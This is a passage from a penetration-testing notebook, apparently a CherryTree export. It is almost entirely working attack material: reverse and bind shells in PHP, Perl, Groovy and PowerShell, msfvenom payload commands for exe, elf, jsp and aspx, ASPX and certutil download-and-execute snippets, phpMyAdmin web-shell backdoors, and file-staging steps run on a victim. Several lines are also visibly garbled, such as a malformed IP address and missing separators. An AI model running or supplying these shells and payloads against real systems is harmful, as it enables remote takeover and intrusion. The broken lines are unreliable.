            <rich_text family="monospace">php $sock=fsockopen("192.168.0.1", 4444)</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;</rich_text>
            <rich_text family="monospace">exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2 &gt;&amp; 3")</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;?&gt;</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">As Command</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">php -r '$sock=fsockopen("192.168.0.1",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</rich_text>
          </node>
        </node>
        <node name="MSFVENOM" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <node name="Windows Binary (.exe)" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Windows Binary (.exe)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">32 Bit (x86)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Output in Hex, C Style, Exclude bad chars, Exitfunction thread:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">64 Bit (x64)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Meterpreter:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
          </node>
          <node name="Linux Binary (.elf)" unique_id="76" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Linux Binary (.elf)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">32 Bit (x86)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x86/shell/bind_tcp  LHOST=192.168.0.1 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> bind_shell.elf</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">64 Bit (x64)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.0.1 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
          </node>
          <node name="Java Server Pages (.jsp)" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Java Server Pages (.jsp)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
            <rich_text>

</rich_text>
            <rich_text family="monospace">msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> shell.jsp</rich_text>
          </node>
          <node name="Active Sever Pages Extended (.aspx)" unique_id="78" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Active Sever Pages Extended (aspx)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
            <rich_text>

</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx</rich_text>
          </node>
        </node>
        <node name="Active Sever Pages Extended (.apsx)" unique_id="79" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text scale="h2">Active Sever Pages Extended (.aspx)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Transfer A File (Certutil)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace">% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
o = </rich_text>
          <rich_text family="monospace" foreground="#6f42c1">cmd.StdOut.Readall</rich_text>
          <rich_text family="monospace">()
Response.write(o)
%</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Execute a File</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace">% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = </rich_text>
          <rich_text family="monospace" foreground="#6f42c1">cmd.StdOut.Readall</rich_text>
          <rich_text family="monospace">()
Response.write(o)
%</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
</rich_text>
        </node>
        <node name="Jenkins / Groovy (Java)" unique_id="80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Jenkins / Groovy (Java)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Linux Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">String host</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"192.168.0.1";
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">int</rich_text>
          <rich_text family="monospace"> port</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">;
String cmd</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"/bin/sh";
Process p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> ProcessBuilder(cmd)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">redirectErrorStream(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">true</rich_text>
          <rich_text family="monospace">)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">start();Socket s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> Socket(host,port);InputStream pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream(),pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getErrorStream(), si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream();OutputStream po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream(),so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(</rich_text>
          <rich_text family="monospace" foreground="#d73a49">!</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">isClosed()){</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();Thread</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">sleep(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">50</rich_text>
          <rich_text family="monospace">);</rich_text>
          <rich_text family="monospace" foreground="#d73a49">try</rich_text>
          <rich_text family="monospace"> {p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">exitValue();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">break</rich_text>
          <rich_text family="monospace">;}</rich_text>
          <rich_text family="monospace" foreground="#d73a49">catch</rich_text>
          <rich_text family="monospace"> (Exception e){}};p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">destroy();s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">close();</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Windows Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">String host</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"192.168.0.1";
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">int</rich_text>
          <rich_text family="monospace"> port</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">;
String cmd</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"cmd.exe";
Process p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> ProcessBuilder(cmd)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">redirectErrorStream(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">true</rich_text>
          <rich_text family="monospace">)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">start();Socket s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> Socket(host,port);InputStream pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream(),pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getErrorStream(), si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream();OutputStream po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream(),so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(</rich_text>
          <rich_text family="monospace" foreground="#d73a49">!</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">isClosed()){</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();Thread</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">sleep(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">50</rich_text>
          <rich_text family="monospace">);</rich_text>
          <rich_text family="monospace" foreground="#d73a49">try</rich_text>
          <rich_text family="monospace"> {p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">exitValue();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">break</rich_text>
          <rich_text family="monospace">;}</rich_text>
          <rich_text family="monospace" foreground="#d73a49">catch</rich_text>
          <rich_text family="monospace"> (Exception e){}};p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">destroy();s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">close();</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="Perl" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Perl</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">perl -MIO </rich_text>
          <rich_text family="monospace" foreground="#d73a49">-e</rich_text>
          <rich_text family="monospace"> 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="PhpmyAdmin" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">PhpmyAdmin
</rich_text>
          <rich_text>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text style="italic">Write a CMD shell into a file with the right permissions. Issue the following select. (Try different paths for different webservers)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Windows</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace" foreground="#d73a49">SELECT</rich_text>
          <rich_text family="monospace"> "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "C:\\xampp\\htdocs\\backdoor.php"</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Unix</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace" foreground="#d73a49">SELECT</rich_text>
          <rich_text family="monospace"> "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "/var/www/html/shell.php"</rich_text>
        </node>
        <node name="powershell" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701626719" ts_lastsave="1701626901">
          <rich_text>

</rich_text>
          <rich_text link="webs https://github.com/samratashok/nishang/tree/master/Shells">https://github.com/samratashok/nishang/tree/master/Shells</rich_text>
          <rich_text>

use this


Ex:  `</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="78" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444`</codebox>
        </node>
      </node>
      <node name="File Transfer" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
        <node name="Powershell" unique_id="50" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1707660323">
          <rich_text underline="single" scale="h1">Powershell</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">As Cmd.exe Command</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.1:80/winprivesc/JuicyPotato.exe','C:\Users\john\Desktop\juicy.exe')</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Encode Command for Transfer</rich_text>
          <rich_text>
Very helpful for chars that need to be escaped otherwise.

</rich_text>
          <rich_text family="monospace">$Command = '(new-object System.Net.WebClient).DownloadFile("http://192.168.0.1:80/ftp.txt","C:\Windows\temp\ftp.txt")' 
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) 
powershell.exe -NoProfile -encoded $Encoded</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

or

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <codebox char_offset="665" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">certutil -urlcache -f http://10.10.10.169.21/rev.exe rev.exe</codebox>
        </node>
        <node name="Certutil" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">Certutil</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download &amp; Execute Python Command</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe &amp; C:\Windows\Temp\shell.exe')</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="SMB" unique_id="52" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">SMB</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Start Impacket SMB Server (With SMB2 Support)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">impacket-smbserver -smb2support server_name /var/www/html</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">List Drives (Execute on Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">net view \\192.168.0.1</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Copy Files (Execute on Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">copy \\192.168.0.1\server_name\shell.exe shell.exe</rich_text>
        </node>
        <node name="PureFTP" unique_id="53" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">PureFTP</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Install</rich_text>
          <rich_text>
apt-get update </rich_text>
          <rich_text foreground="#d73a49">&amp;&amp;</rich_text>
          <rich_text> apt-get install pure-ftpd

</rich_text>
          <rich_text underline="single" scale="h2">Create setupftp.sh Execute The Script</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#6a737d">#!</rich_text>
          <rich_text family="monospace">/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd myftpuser -u ftpuser -d /ftphome
pure-pw mkdb
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">cd</rich_text>
          <rich_text family="monospace"> /etc/pure-ftpd/auth/
sudo ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/40PureDBexit
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart./setupftp.sh</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Get Service Ready</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Reset Password</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">pure-pw passwd offsec -f /etc/pure-ftpd/pureftpd.passwd</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Commit Changes</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">pure-pw mkdb</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Restart Service</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">/etc/init.d/pure-ftpd restart</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Create FTP Script (On Victim</rich_text>
          <rich_text>)
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> open 192.168.0.</rich_text>
          <rich_text family="monospace" foreground="#d73a49">1&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> USER myftpuser</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> mypassword</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> bin</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
